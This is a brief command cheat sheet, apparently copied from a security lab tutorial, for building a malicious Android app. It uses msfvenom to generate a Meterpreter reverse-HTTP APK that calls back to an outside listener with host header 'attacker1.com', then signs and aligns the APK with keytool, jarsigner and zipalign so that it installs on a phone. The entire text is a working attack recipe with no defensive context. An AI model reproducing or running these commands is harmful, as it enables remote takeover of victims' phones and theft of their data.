===android apk=====
> https://resources.infosecinstitute.com/topic/lab-hacking-an-android-device-with-msfvenom/
+ msfvenom -p android/meterpreter_reverse_http LHOST=192.168.1.56 LPORT=8099 HttpHostHeader=attacker1.com R>android_shell.apk
+ keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
+ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android_shell.apk hacked
+ jarsigner -verify -verbose -certs android_shell.apk
+ zipalign -v 4 android_shell.apk singed_jar.apk
